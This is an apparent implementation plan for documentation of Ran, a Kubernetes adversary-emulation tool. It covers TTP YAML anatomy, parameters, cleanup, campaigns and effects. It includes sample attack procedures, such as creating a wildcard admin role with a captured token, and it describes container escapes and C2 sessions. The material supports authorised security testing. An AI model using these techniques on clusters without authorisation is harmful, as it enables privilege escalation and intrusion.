# Ran mdBook Documentation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a complete mdBook documentation site at `docs/book/` covering atomic testing, campaign emulation, the armory, and the TTP YAML authoring contract for both human and agent readers.

**Architecture:** Journey-based structure: scaffold → introduce concepts through atomic testing and the armory → campaign emulation as the core → TTP authoring for extension → reference catalog → dedicated agent section. Each chapter is a focused Markdown file; `docs/book/src/SUMMARY.md` is the single authoritative table of contents.

**Tech Stack:** [mdBook](https://rust-lang.github.io/mdBook/) (`cargo install mdbook` or `brew install mdbook`), Markdown, YAML examples from the live armory.

---

## File Map

```
docs/book/
├── book.toml
└── src/
    ├── SUMMARY.md
    ├── introduction.md
    ├── getting-started/
    │   ├── installation.md
    │   └── cluster.md
    ├── armory/
    │   ├── overview.md
    │   ├── browsing.md
    │   ├── anatomy.md
    │   └── custom.md
    ├── atomic/
    │   ├── running.md
    │   ├── targeting.md
    │   ├── parameters.md
    │   └── cleanup.md
    ├── campaign/
    │   ├── overview.md
    │   ├── context-model.md
    │   ├── effects.md
    │   ├── preconditions.md
    │   ├── running.md
    │   ├── c2.md
    │   └── trail.md
    ├── extending/
    │   ├── when.md
    │   ├── procedures.md
    │   ├── preconditions.md
    │   └── effects.md
    ├── reference/
    │   ├── yaml-fields.md
    │   ├── effects.md
    │   └── preconditions.md
    └── agents/
        ├── authoring.md
        └── api-mcp.md
```

---

## Task 1: Scaffold mdBook project

**Files:**
- Create: `docs/book/book.toml`
- Create: `docs/book/src/SUMMARY.md`
- Create: all stub chapter files listed in the file map above (one heading each)

- [ ] **Step 1: Install mdBook if not present**

```bash
mdbook --version 2>/dev/null || cargo install mdbook
```

- [ ] **Step 2: Create `docs/book/book.toml`**

```toml
[book]
title = "Ran — Kubernetes Adversary Emulation"
authors = ["Manifold Security"]
language = "en"
src = "src"

[build]
build-dir = "book"

[output.html]
git-repository-url = "https://github.com/magier/ran"
edit-url-template = "https://github.com/magier/ran/edit/main/docs/book/src/{path}"
```

- [ ] **Step 3: Create `docs/book/src/SUMMARY.md`**

```markdown
# Summary

[Introduction](introduction.md)

# Getting Started

- [Installation](getting-started/installation.md)
- [Connecting to a Cluster](getting-started/cluster.md)

# The Armory

- [What is the Armory?](armory/overview.md)
- [Browsing Available TTPs](armory/browsing.md)
- [TTP Anatomy](armory/anatomy.md)
- [Custom Armory Directory](armory/custom.md)

# Atomic Testing

- [Running a TTP](atomic/running.md)
- [Targeting](atomic/targeting.md)
- [Parameters](atomic/parameters.md)
- [Cleanup](atomic/cleanup.md)

# Campaign Emulation

- [What is a Campaign?](campaign/overview.md)
- [The Context Model](campaign/context-model.md)
- [Effects](campaign/effects.md)
- [Preconditions](campaign/preconditions.md)
- [Running Multi-Step Emulation](campaign/running.md)
- [The C2 Layer](campaign/c2.md)
- [Reading the Attack Trail](campaign/trail.md)

# Extending the Armory

- [When to Write a Custom TTP](extending/when.md)
- [Writing Procedures](extending/procedures.md)
- [Preconditions in Depth](extending/preconditions.md)
- [Effects in Depth](extending/effects.md)

# Reference

- [YAML Field Catalog](reference/yaml-fields.md)
- [Effect Catalog](reference/effects.md)
- [Precondition Types](reference/preconditions.md)

# For Agents

- [Authoring TTPs as an Agent](agents/authoring.md)
- [Using Ran via API and MCP](agents/api-mcp.md)
```

- [ ] **Step 4: Create stub files for every chapter**

Create each file below with only a `# <Title>` heading and one sentence: `This chapter is under construction.`

Files to create:
- `docs/book/src/introduction.md` → `# Introduction`
- `docs/book/src/getting-started/installation.md` → `# Installation`
- `docs/book/src/getting-started/cluster.md` → `# Connecting to a Cluster`
- `docs/book/src/armory/overview.md` → `# What is the Armory?`
- `docs/book/src/armory/browsing.md` → `# Browsing Available TTPs`
- `docs/book/src/armory/anatomy.md` → `# TTP Anatomy`
- `docs/book/src/armory/custom.md` → `# Custom Armory Directory`
- `docs/book/src/atomic/running.md` → `# Running a TTP`
- `docs/book/src/atomic/targeting.md` → `# Targeting`
- `docs/book/src/atomic/parameters.md` → `# Parameters`
- `docs/book/src/atomic/cleanup.md` → `# Cleanup`
- `docs/book/src/campaign/overview.md` → `# What is a Campaign?`
- `docs/book/src/campaign/context-model.md` → `# The Context Model`
- `docs/book/src/campaign/effects.md` → `# Effects`
- `docs/book/src/campaign/preconditions.md` → `# Preconditions`
- `docs/book/src/campaign/running.md` → `# Running Multi-Step Emulation`
- `docs/book/src/campaign/c2.md` → `# The C2 Layer`
- `docs/book/src/campaign/trail.md` → `# Reading the Attack Trail`
- `docs/book/src/extending/when.md` → `# When to Write a Custom TTP`
- `docs/book/src/extending/procedures.md` → `# Writing Procedures`
- `docs/book/src/extending/preconditions.md` → `# Preconditions in Depth`
- `docs/book/src/extending/effects.md` → `# Effects in Depth`
- `docs/book/src/reference/yaml-fields.md` → `# YAML Field Catalog`
- `docs/book/src/reference/effects.md` → `# Effect Catalog`
- `docs/book/src/reference/preconditions.md` → `# Precondition Types`
- `docs/book/src/agents/authoring.md` → `# Authoring TTPs as an Agent`
- `docs/book/src/agents/api-mcp.md` → `# Using Ran via API and MCP`

- [ ] **Step 5: Verify the scaffold builds**

```bash
mdbook build docs/book
```

Expected: exits 0, no errors or warnings about missing files.

- [ ] **Step 6: Add build output to .gitignore**

In the repo root `.gitignore`, append:

```
docs/book/book/
```

- [ ] **Step 7: Commit**

```bash
git add docs/book/ .gitignore
git commit -m "docs(book): scaffold mdbook project with full chapter outline"
```

---

## Task 2: Introduction and Getting Started

**Files:**
- Write: `docs/book/src/introduction.md`
- Write: `docs/book/src/getting-started/installation.md`
- Write: `docs/book/src/getting-started/cluster.md`

- [ ] **Step 1: Write `docs/book/src/introduction.md`**

```markdown
# Introduction

Ran is an adversary emulation platform for Kubernetes clusters. It lets security
practitioners and AI agents execute realistic, multi-step attack sequences against
their own infrastructure — following the same paths a real attacker would take,
not just firing isolated commands.

## Why adversary emulation?

A common security cliché:

> *An attacker only has to be right once, but a defender has to be right every time.*

This holds for Initial Access — but the dynamic shifts after that. Post-compromise,
defenders have full environmental visibility while the attacker must explore. Ran
turns that advantage into something actionable: by replaying how an adversary
discovers and pivots through your environment, you surface detection gaps that
atomic, single-event tests miss entirely.

## What Ran is not

Ran is not a passive scanner. It executes real techniques against real resources.
Only run it against clusters you own or have explicit written authorisation to test.

## How this book is organised

| Section | What you'll learn |
|---|---|
| [The Armory](armory/overview.md) | What TTPs are and how the armory is structured |
| [Atomic Testing](atomic/running.md) | Run a single technique, pass parameters, clean up |
| [Campaign Emulation](campaign/overview.md) | Multi-step emulation and the live knowledge graph |
| [Extending the Armory](extending/when.md) | Write your own TTP YAML when the built-ins aren't enough |
| [Reference](reference/yaml-fields.md) | Complete field and effect reference |
| [For Agents](agents/authoring.md) | Precise contract for AI-authored TTPs and API usage |

## Key terms

| Term | Meaning |
|---|---|
| **TTP** | Tactic, Technique, and Procedure — one discrete adversary action |
| **Tactic** | The adversary's goal (e.g. *Discovery*, *Privilege Escalation*) |
| **Technique** | The method used to achieve the tactic |
| **Armory** | Ran's library of pre-built, executable TTPs |
| **Campaign** | A live emulation session that tracks discovered entities and relations |
| **Entity** | A cluster resource discovered during emulation (pod, service account, node…) |
| **Effect** | A declaration in a TTP's YAML that describes what the TTP reveals or establishes |
| **Precondition** | A constraint that must be satisfied before a TTP can run against a target |
```

- [ ] **Step 2: Write `docs/book/src/getting-started/installation.md`**

```markdown
# Installation

## Binary (recommended)

Pre-built binaries for Linux, macOS (Intel and Apple Silicon), and Windows are
available on the [Releases page](https://github.com/magier/ran/releases/latest).

```sh
# macOS — Apple Silicon
curl -sL https://github.com/magier/ran/releases/latest/download/ran-darwin-arm64.tar.gz | tar xz
chmod +x ran && sudo mv ran /usr/local/bin/

# macOS — Intel
curl -sL https://github.com/magier/ran/releases/latest/download/ran-darwin-amd64.tar.gz | tar xz
chmod +x ran && sudo mv ran /usr/local/bin/

# Linux (amd64)
curl -sL https://github.com/magier/ran/releases/latest/download/ran-linux-amd64.tar.gz | tar xz
chmod +x ran && sudo mv ran /usr/local/bin/
```

Verify:

```sh
ran --version
```

## Docker

```sh
docker pull ghcr.io/magier/ran:latest
```

Run against your local kubeconfig:

```sh
docker run --rm -it \
  -v ~/.kube:/root/.kube:ro \
  -p 8080:8080 \
  ghcr.io/magier/ran:latest emulate --port 8080
```

Then open `http://localhost:8080`.

## Build from source

**Prerequisites:** Go 1.24+, Node.js 20+, pnpm

```sh
git clone https://github.com/magier/ran.git
cd ran
make build
./dist/ran --version
```
```

- [ ] **Step 3: Write `docs/book/src/getting-started/cluster.md`**

```markdown
# Connecting to a Cluster

Ran uses your local kubeconfig to discover and target cluster resources. No
in-cluster agent or sidecar is required for most techniques.

> **Important:** Only run Ran against clusters you own or have explicit written
> authorisation to test.

## Default: use your current context

Ran reads `~/.kube/config` by default and uses whichever context `kubectl` would
use for the same operation. To check:

```sh
kubectl config current-context
```

## Namespace filtering

By default Ran shows every namespace. To reduce noise, create a `ran.yaml` in
your working directory:

```yaml
namespaces:
  # Hide system namespaces
  excluded:
    - kube-system
    - kube-public
    - kube-node-lease
```

Or use an allowlist instead (takes precedence over `excluded`):

```yaml
namespaces:
  included:
    - default
    - staging
```

Copy the example to get started:

```sh
cp ran.yaml.example ran.yaml
```

## Godmode

Pass `--godmode` to `ran emulate` if you want Ran to preload all cluster resources
from your kubeconfig on startup, rather than discovering them incrementally as you
run TTPs:

```sh
ran emulate --godmode
```

This is useful when you already have broad cluster access and want the full picture
immediately.

## What's next

With a cluster reachable, head to [The Armory](../armory/overview.md) to see what
techniques are available before running your first test.
```

- [ ] **Step 4: Build and verify**

```bash
mdbook build docs/book
```

Expected: exits 0, no errors.

- [ ] **Step 5: Commit**

```bash
git add docs/book/src/introduction.md docs/book/src/getting-started/
git commit -m "docs(book): write introduction and getting-started chapters"
```

---

## Task 3: Armory — Overview and Browsing

**Files:**
- Write: `docs/book/src/armory/overview.md`
- Write: `docs/book/src/armory/browsing.md`

- [ ] **Step 1: Write `docs/book/src/armory/overview.md`**

```markdown
# What is the Armory?

The armory is Ran's library of executable techniques. Each entry is a YAML file
that describes a single adversary action: what it does, which MITRE ATT&CK tactic
and technique it maps to, what conditions must be true before it can run, how to
execute it, and what it reveals about the target environment once it succeeds.

## Organisation

Techniques are grouped by MITRE tactic:

```
armory/TTPs/
├── CommandAndControl/
├── CredentialAccess/
├── Defense Evasion/
├── Discovery/
├── Execution/
├── Impact/
├── InitialAccess/
├── Lateral Movement/
├── Persistence/
├── Privilege Escalation/
└── Resource Development/
```

The directory a TTP lives in determines its tactic. If a YAML file also declares
a `tactic:` field, that takes precedence over the directory name.

## What makes the armory different

Most attack simulation libraries are collections of raw commands. The Ran armory
goes further:

- **Preconditions** — each TTP declares what access, RBAC permissions, or discovered
  entities must already exist before it can run. Ran uses these to surface only the
  techniques that are actually applicable to your current situation.
- **Effects** — each TTP declares what it discovers or establishes. After a technique
  runs, its effects update a live knowledge graph of the cluster, automatically
  unlocking follow-on techniques that depend on that new knowledge.
- **Multiple procedures** — a single TTP can offer several equivalent implementations
  (e.g. `kubectl` and a raw `curl` against the API server) so you can choose the
  one that fits your access.

## The built-in armory vs custom armories

Ran ships with a built-in armory of ~80 techniques. You can point it at a custom
directory of additional YAML files using the `--armory` flag, which is covered in
[Custom Armory Directory](custom.md). Instructions for writing your own techniques
are in [Extending the Armory](../extending/when.md).
```

- [ ] **Step 2: Write `docs/book/src/armory/browsing.md`**

```markdown
# Browsing Available TTPs

## List all techniques

```sh
ran armory
```

This prints every enabled TTP, grouped by tactic, with its ID and description.

## Inspect a specific TTP

```sh
ran armory <id>
```

Example:

```sh
ran armory get-serviceaccounts
```

Output shows the full YAML-derived detail: description, MITRE mapping, parameters
with their defaults and types, preconditions, and the available procedures.

## Filter by tactic

```sh
ran armory --tactic Discovery
```

## Interactive UI

When you run `ran emulate`, the web UI shows the full armory on the left panel,
filterable by tactic. Clicking a technique opens its detail view with parameter
forms. The UI also highlights which techniques are *applicable* given the current
campaign state — preconditions that are already satisfied turn green.

## Understanding technique status

Every TTP in the armory has a `status` field:

| Status | Meaning |
|---|---|
| `enabled` (default) | Ready to run |
| `stable` | Synonym for `enabled` |
| `draft` | Under development; included in the armory but may have rough edges |
| `disabled` | Excluded from listings and cannot be invoked |

Disabled techniques are typically ones under active development or that require
infrastructure (like a live CVE PoC binary) not included in the release.
```

- [ ] **Step 3: Build and verify**

```bash
mdbook build docs/book
```

Expected: exits 0.

- [ ] **Step 4: Commit**

```bash
git add docs/book/src/armory/overview.md docs/book/src/armory/browsing.md
git commit -m "docs(book): write armory overview and browsing chapters"
```

---

## Task 4: Armory — TTP Anatomy and Custom Armory

**Files:**
- Write: `docs/book/src/armory/anatomy.md`
- Write: `docs/book/src/armory/custom.md`

- [ ] **Step 1: Write `docs/book/src/armory/anatomy.md`**

```markdown
# TTP Anatomy

Every TTP in the armory is a YAML file. Here is a representative example — the
*Get ServiceAccounts* technique from the Discovery tactic:

```yaml
name: Get ServiceAccounts via API Server
description: Get a list of ServiceAccounts via the API server
tactic: Discovery
techniques: ["Container and Resource Discovery", T1613]
preconditions:
  rbac:
    - verb: get
      resource: serviceaccounts
parameters:
  TOKEN:
    type: ServiceAccount
    description: The ServiceAccount token used to authorise this request
    optional: true
  NS:
    type: Namespace
    description: The namespace to query
    default: ${NS}
  ALL_NS:
    type: bool
    description: Query all namespaces
    default: false
procedures:
  - key: kubectl
    command: >-
      kubectl get serviceaccounts --token=${TOKEN} -n=${NS} -A=${ALL_NS}
      --output=json
  - key: k8s-request
    k8s_request:
      api_server: ${API_SERVER}
      api: /api/v1
      resource: serviceaccounts
      namespace: ${NS}
      cluster_scoped: ${ALL_NS}
      token: ${TOKEN}
effects:
  - k8s.serviceAccountList
```

## Top-level fields

| Field | Required | Description |
|---|---|---|
| `name` | yes | Human-readable display name |
| `id` | no | Stable identifier used for `ran invoke`; auto-derived from `name` if omitted (kebab-case) |
| `description` | no | One or two sentences explaining what the technique does |
| `tactic` | no | MITRE ATT&CK tactic; defaults to the parent directory name |
| `techniques` | no | List of MITRE technique names and/or IDs (e.g. `["T1613"]`) |
| `status` | no | `enabled` (default), `stable`, `draft`, or `disabled` |
| `parameters` | no | Named input variables (see [Parameters](../atomic/parameters.md)) |
| `preconditions` | no | Constraints that gate when this TTP is applicable (see [Preconditions](../campaign/preconditions.md)) |
| `procedures` | yes* | One or more execution methods |
| `cleanup` | no | A single procedure to undo the technique's side-effects |
| `effects` | no | What the technique reveals or establishes (see [Effects](../campaign/effects.md)) |
| `references` | no | URLs to CVE write-ups, ATT&CK pages, research, etc. |

*A TTP with no procedures is valid but cannot be invoked.

## Procedures at a glance

A TTP can offer multiple procedures — one per available tool or method. Ran shows
them as selectable options in the UI. The full authoring guide is in
[Writing Procedures](../extending/procedures.md); the short version:

- **Shell command** — `command: kubectl get pods …`
- **Structured K8s API call** — `k8s_request:` block; Ran materialises this into a
  kubectl or curl command at runtime
- **Structured HTTP request** — `http_request:` block
- **Step sequence** — `steps:` list of typed actions (fetch, chmod, run, …)

## What comes next

When you understand the anatomy, the next step is to run a technique. Head to
[Running a TTP](../atomic/running.md).
```

- [ ] **Step 2: Write `docs/book/src/armory/custom.md`**

```markdown
# Custom Armory Directory

Ran loads TTPs from its built-in armory by default. You can supplement or replace
this with your own YAML files by pointing Ran at a custom directory.

## Using `--armory`

```sh
ran emulate --armory /path/to/my-ttps
ran invoke my-custom-ttp --armory /path/to/my-ttps
```

Ran scans the directory recursively for `*.yaml` files and merges them with (or
replaces, depending on IDs) the built-in armory.

## Organising your custom armory

Follow the same tactic-directory convention as the built-in armory:

```
my-ttps/
├── Discovery/
│   └── enumerate_custom_crds.yaml
├── Privilege Escalation/
│   └── exploit_internal_api.yaml
└── Impact/
    └── corrupt_etcd_backup.yaml
```

If a YAML file has no `tactic:` field, the tactic is inferred from its parent
directory name.

## ID collisions

If a custom TTP has the same `id` as a built-in TTP, the custom one wins. Use
this to override individual techniques without forking the whole armory.

## Writing your own TTPs

The full guide for writing valid YAML is in [Extending the Armory](../extending/when.md).
```

- [ ] **Step 3: Build and verify**

```bash
mdbook build docs/book
```

Expected: exits 0.

- [ ] **Step 4: Commit**

```bash
git add docs/book/src/armory/anatomy.md docs/book/src/armory/custom.md
git commit -m "docs(book): write armory anatomy and custom armory chapters"
```

---

## Task 5: Atomic Testing — Running and Targeting

**Files:**
- Write: `docs/book/src/atomic/running.md`
- Write: `docs/book/src/atomic/targeting.md`

- [ ] **Step 1: Write `docs/book/src/atomic/running.md`**

```markdown
# Running a TTP

Ran offers two modes for executing a single technique: the command line and the
interactive web UI.

## CLI: `ran invoke`

Invoke a specific TTP by its ID without starting the full web server:

```sh
ran invoke <ttp-id> --target <namespace>/<pod>
```

Examples:

```sh
# List all pods from within a compromised pod
ran invoke get-pods --target default/my-pod

# Enumerate service accounts cluster-wide
ran invoke get-serviceaccounts --target default/my-pod --param ALL_NS=true

# List all available TTPs first
ran armory
```

The `--target` flag selects the entity the TTP runs against. For most techniques
this is a pod, but some (like `Initial Access` or `Resource Development`) do not
require a target and run locally.

## Web UI: `ran emulate`

Start the Ran server and open the UI in your browser:

```sh
ran emulate
# 🚀 Server started on :8080
```

Open `http://localhost:8080`.

The UI is divided into three panels:

- **Left:** the armory, filterable by tactic. Applicable TTPs (preconditions met)
  are highlighted.
- **Centre:** the cluster map — entities discovered so far and the relations between them.
- **Right:** execution panel for the selected TTP — parameters, procedure choice,
  and the output log.

To run a technique: select a target entity in the centre panel → pick a TTP from
the left panel → adjust parameters if needed → click **Execute**.

## Key flags

| Flag | Default | Description |
|---|---|---|
| `--port`, `-p` | `8080` | Port the web UI listens on |
| `--target`, `-t` | — | Initial target: `<namespace>/<pod-or-service>` |
| `--godmode` | `false` | Pre-load all cluster resources from kubeconfig on startup |
| `--armory`, `-a` | — | Path to a custom armory directory |
| `--config` | `ran.yaml` | Path to a custom config file |
```

- [ ] **Step 2: Write `docs/book/src/atomic/targeting.md`**

```markdown
# Targeting

Most TTPs run *against* a specific cluster resource — a pod, a service account, a
node. Ran calls this the **target entity**. The target determines which resource
receives the technique's commands and whose credentials are used for API calls.

## Targeting syntax

On the CLI, targets are specified as `<namespace>/<name>`:

```sh
ran invoke get-pods --target default/compromised-pod
ran invoke get-secrets --target production/attacker-sa
```

In the web UI, click any entity in the cluster map to select it as the current
target before invoking a TTP.

## Entity kinds as targets

Different TTPs expect different target kinds. A Discovery TTP that runs `kubectl`
inside a pod requires a **Pod** target. A technique that tests API server permissions
for a captured service account requires a **ServiceAccount** target.

The armory's [preconditions](../campaign/preconditions.md) define what kind each
TTP expects. In the UI, selecting a target automatically filters the armory to show
only techniques applicable to that entity type.

## Techniques that don't need a target

Some tactics don't require a pre-existing cluster entity:

- **Initial Access** — connecting via a leaked kubeconfig, for example, happens
  before any entity has been discovered
- **Resource Development** — setting up C2 infrastructure runs on the operator's
  machine, not inside the cluster
- **Lateral Movement** — the movement itself establishes the new foothold

These TTPs can be invoked without `--target` and appear in the UI without requiring
a selected entity.

## Special entity IDs

In [effects](../campaign/effects.md) and some parameter defaults, `sys` refers to
the entity the TTP is currently running against. You'll see this in effect strings
like `container.escape(sys)` — meaning "the escape happened from the current target."
```

- [ ] **Step 3: Build and verify**

```bash
mdbook build docs/book
```

Expected: exits 0.

- [ ] **Step 4: Commit**

```bash
git add docs/book/src/atomic/running.md docs/book/src/atomic/targeting.md
git commit -m "docs(book): write atomic testing running and targeting chapters"
```

---

## Task 6: Atomic Testing — Parameters and Cleanup

**Files:**
- Write: `docs/book/src/atomic/parameters.md`
- Write: `docs/book/src/atomic/cleanup.md`

- [ ] **Step 1: Write `docs/book/src/atomic/parameters.md`**

```markdown
# Parameters

Parameters are the inputs a TTP needs to run. They appear as `parameters:` in the
YAML and as editable fields in the web UI.

## Declaring parameters in YAML

```yaml
parameters:
  TOKEN:
    type: ServiceAccount
    description: The ServiceAccount token to use
    optional: true
  NS:
    type: Namespace
    description: The target namespace
    default: ${NS}
  ALL_NS:
    type: bool
    description: Query all namespaces instead of just one
    default: false
```

Each parameter has a name (the YAML key), a type, a description, an optional flag,
and a default value.

## Parameter types

| Type | What it means |
|---|---|
| `string` (default) | Any text value |
| `Namespace` | A Kubernetes namespace name |
| `ServiceAccount` | A JWT token belonging to a captured service account |
| `bool` | `true` or `false` |
| `int` | An integer |

`ServiceAccount` and `Namespace` parameters in the UI render as dropdowns populated
from entities already discovered in the campaign.

## Required vs optional

Parameters are required by default. Set `optional: true` (or `required: false`) to
make a parameter skippable:

```yaml
KERNEL_VERSION:
  type: string
  required: false
  description: Kernel version of the target node
```

## Special built-in variables

Ran injects a set of variables into every TTP invocation. You can reference them
as defaults or directly in command strings:

| Variable | Value |
|---|---|
| `${NS}` | Namespace of the current target entity |
| `${TOKEN}` | JWT token of the best available service account |
| `${API_SERVER}` | URL of the Kubernetes API server |
| `${TARGET.IP}` | IP address of the current target entity |
| `${TARGET_ID}` | Ran's internal entity ID for the current target |

Example usage in a command:

```yaml
procedures:
  - key: curl
    command: >-
      curl -H "Authorization: Bearer ${TOKEN}"
      "${API_SERVER}/api/v1/namespaces/${NS}/pods"
```

## Overriding parameters on the CLI

```sh
ran invoke get-serviceaccounts --target default/pod \
  --param NS=kube-system \
  --param ALL_NS=true
```

In the web UI, all parameters appear as editable fields above the Execute button.
```

- [ ] **Step 2: Write `docs/book/src/atomic/cleanup.md`**

```markdown
# Cleanup

Some techniques leave side-effects in the cluster: created roles, role bindings,
deployed pods, injected configuration. Cleanup procedures reverse those changes.

## How cleanup is declared

A TTP can declare a single `cleanup:` procedure alongside its regular `procedures:`:

```yaml
procedures:
  - key: kubectl
    command: kubectl create role nsadmin --verb=* --resource=* --token=${TOKEN} -n=${NS}

cleanup:
  command: kubectl delete role nsadmin --token=${TOKEN} -n=${NS}
```

The cleanup procedure follows the same format as a regular procedure (shell command,
`k8s_request`, `http_request`, or `steps`).

## Running cleanup in the web UI

After a technique executes successfully, a **Clean Up** button appears in the
execution panel. Clicking it runs the cleanup procedure against the same target
and with the same parameters that were used during execution.

## Running cleanup on the CLI

```sh
ran cleanup <ttp-id> --target <namespace>/<pod>
```

This invokes the cleanup procedure for the named TTP.

## When cleanup matters

Not all techniques need cleanup. Read-only discovery techniques (listing pods,
enumerating RBAC) leave no trace in the cluster and have no cleanup procedure.
Techniques that create or modify cluster resources — creating roles, binding service
accounts, spawning pods — should declare cleanup so you can restore the cluster to
its original state after testing.

## What cleanup does not cover

Cleanup reverses the *direct* cluster-side effect of the TTP. It does not:

- Remove entries from Ran's internal knowledge graph (the campaign state)
- Delete logs or events already captured by your monitoring stack
- Undo changes to external systems (e.g. cloud provider APIs)

If you need a full environment reset, rebuild your test cluster from scratch.
```

- [ ] **Step 3: Build and verify**

```bash
mdbook build docs/book
```

Expected: exits 0.

- [ ] **Step 4: Commit**

```bash
git add docs/book/src/atomic/parameters.md docs/book/src/atomic/cleanup.md
git commit -m "docs(book): write atomic testing parameters and cleanup chapters"
```

---

## Task 7: Campaign — Overview and Context Model

**Files:**
- Write: `docs/book/src/campaign/overview.md`
- Write: `docs/book/src/campaign/context-model.md`

- [ ] **Step 1: Write `docs/book/src/campaign/overview.md`**

```markdown
# What is a Campaign?

Running a single TTP is useful for verifying one detection rule. But real attackers
don't fire isolated commands — they explore, adapt, and chain techniques based on
what they discover. A **campaign** is Ran's model for that kind of continuous,
evolving emulation.

## The core idea

When you start `ran emulate`, Ran creates a live **knowledge graph** of your cluster.
The graph starts empty (or pre-seeded if you use `--godmode`). As you execute
techniques, the graph grows:

1. You run *Read Environment Variables* on a compromised pod.
2. Ran parses the output and discovers a `ServiceAccount` token in the environment.
3. The new service account appears in the graph.
4. Ran checks which techniques are now applicable — and surfaces *Get Pods*, *Get
   Secrets*, and any other technique that requires a captured service account.
5. You pick *Create Admin Role*, which requires RBAC `create` on `roles`.
6. Ran checks whether the captured service account has that permission. It does.
7. The technique runs. A new `K8sRole` entity appears in the graph, bound to the
   service account via a `k8s.rolebinding` relation.

At each step the graph reflects the actual state of your foothold — not a static
inventory, but a record of what an adversary would know and be able to do at that
moment.

## What a campaign tracks

- **Entities** — discrete cluster resources: pods, nodes, service accounts, roles,
  role bindings, C2 servers, and more. See [The Context Model](context-model.md).
- **Relations** — how entities connect: which pod runs on which node, which
  service account can exec into which pod, which node has been escaped from.
- **Execution record** — the ordered log of every TTP invocation, its parameters,
  its raw output, and which entities and relations it produced.

## Campaign lifecycle

A campaign exists for the duration of a `ran emulate` session. It is not persisted
to disk by default. The execution record can be exported as a MITRE Attack Flow
document for reporting and follow-up analysis — see [Reading the Attack Trail](trail.md).
```

- [ ] **Step 2: Write `docs/book/src/campaign/context-model.md`**

```markdown
# The Context Model

The campaign maintains a **knowledge graph** — a set of typed entities and the
directed relations between them. This is the "world model" the emulation works
with: what the adversary has found, where they can go, and what they can do.

## Entities

Each entity is a cluster resource with a stable ID. Entity IDs follow a path
convention:

| Entity type | ID format | Example |
|---|---|---|
| Pod | `pod/<namespace>/<name>` | `pod/default/nginx-7d5` |
| ServiceAccount | `sa/<namespace>/<name>` | `sa/default/ci-deployer` |
| Node | `node/<name>` | `node/worker-1` |
| K8sRole | `role/<namespace>/<name>` | `role/default/nsadmin` |
| K8sRoleBinding | `rolebinding/<namespace>/<name>` | `rolebinding/default/nsadmin-binding` |
| CronJob | `cronjob/<namespace>/<name>` | `cronjob/default/cleanup` |
| C2Server | `c2/<id>` | `c2/sliver` |

Entities carry runtime data: a pod knows its node name (if discovered), its
mounted service account (if enumerated), and its current access level. A service
account accumulates RBAC entitlements as they are discovered via
`SelfSubjectRulesReview` or role enumeration.

## Relations

Relations are directed edges in the graph. They record how entities are connected
and, critically, how commands can be routed through the graph.

| Relation | Direction | Meaning |
|---|---|---|
| `runs-on` | pod → node | This pod runs on this node |
| `k8s.can-exec` | actor → pod | Actor can `kubectl exec` into this pod |
| `k8s.can-reach` | source → target | Source can reach target over the network |
| `k8s.kubelet-exec` | pod → node | Pod can exec commands on the node via the kubelet API |
| `container.escape` | pod → node | Pod has a proven container escape path to this node |
| `rce.can-exec` | source → target | Source has RCE on target via an exploit chain |
| `c2.session` | C2 → target | An active C2 session exists from this server to this target |

Some relations carry an **envelope** — the command template used to reach the
target. For example, a `container.escape` relation stores the `nsenter` invocation
that breaks out of the container. When you later run techniques "from" the escaped
node, Ran wraps your commands with that envelope automatically.

## The access level

Every entity has an **access level** — a measure of the foothold the adversary
has on it:

| Level | Meaning |
|---|---|
| `None` | Known to exist, but no interactive access |
| `Exec` | Can execute arbitrary commands (kubectl exec, RCE, C2 session) |

Access level determines whether techniques that require execution (most techniques
other than pure API calls) are applicable to a given entity.

## How the graph grows

The graph grows in two ways:

1. **Effects** — each TTP declares [effects](effects.md) in its YAML. After a
   successful run, Ran parses the effect strings and applies the resulting entity
   and relation updates.
2. **Output parsers** — Ran parses structured command output (e.g. `kubectl get
   pods -o json`) to extract entities even when no explicit effect is declared.

Ran also runs a set of **inference rules** after each update. For example: if a
pod entity and a runs-on relation are both present, and the node has a known
kubelet endpoint, Ran infers a `k8s.kubelet-exec` relation automatically.
```

- [ ] **Step 3: Build and verify**

```bash
mdbook build docs/book
```

Expected: exits 0.

- [ ] **Step 4: Commit**

```bash
git add docs/book/src/campaign/overview.md docs/book/src/campaign/context-model.md
git commit -m "docs(book): write campaign overview and context model chapters"
```

---

## Task 8: Campaign — Effects

**Files:**
- Write: `docs/book/src/campaign/effects.md`

- [ ] **Step 1: Write `docs/book/src/campaign/effects.md`**

```markdown
# Effects

An effect is a declaration in a TTP's YAML that tells Ran what the technique
produces when it succeeds. Effects are the bridge between raw command output and
the structured knowledge graph.

## Why effects matter

Without effects, each TTP execution is a dead end — you see the output, but Ran
doesn't know what it means. With effects, a successful *Create Admin Role* run
produces a `K8sRole` entity in the graph, which immediately unlocks every technique
that requires a role to exist.

## Declaring effects

```yaml
effects:
  - k8s.serviceAccountList
  - container.escape(sys)
  - c2.session(sliver, sys)
```

Each string is an effect expression. Ran evaluates them after the TTP completes
successfully.

## Simple effects

Simple effects have no arguments. They extract entities from the execution context
(the parameter values that were active when the TTP ran):

| Effect | Entity created | Required context keys |
|---|---|---|
| `k8s.pod` | `Pod` | `Namespace`, `PodName` (optional: `NodeName`, `ServiceAccount`, `IsRunning`) |
| `k8s.serviceaccount` | `ServiceAccount` | `Namespace`, `ServiceAccountName` (optional: `Token`) |
| `k8s.role` | `K8sRole` | `Namespace`, `RoleName` (optional: `Rules` as JSON) |
| `k8s.rolebinding` | `K8sRoleBinding` | `Namespace`, `BindingName` (optional: `RoleRef`, `Subjects` as JSON) |
| `k8s.cronjob` | `CronJob` | `Namespace`, `CronJobName` (optional: `Schedule`) |

`k8s.serviceAccountList`, `k8s.podList`, and similar list-form effects trigger
the **output parser** pipeline — Ran reads the raw command output (expected to be
a Kubernetes JSON list) and extracts individual entities from it automatically.

## Relation effects

Relation effects take positional arguments and create directed edges in the graph:

| Effect expression | Relation created | Description |
|---|---|---|
| `k8s.can-exec(src, tgt)` | `PodExec` | `src` can kubectl-exec into `tgt` |
| `k8s.can-reach(src, tgt)` | `CanReach` | `src` can reach `tgt` over the network |
| `runs-on(pod, node)` | `RunsOn` | `pod` runs on `node` |
| `k8s.kubelet-exec(src, tgt)` | `KubeletExecSource` | `src` can exec on nodes via the kubelet API |
| `container.escape(src)` | `ContainerEscape` + `RunsOn` | `src` has a proven escape to its host node |
| `rce.can-exec(src, tgt)` | `RceCanExec` | `src` has RCE on `tgt` via an exploit chain |
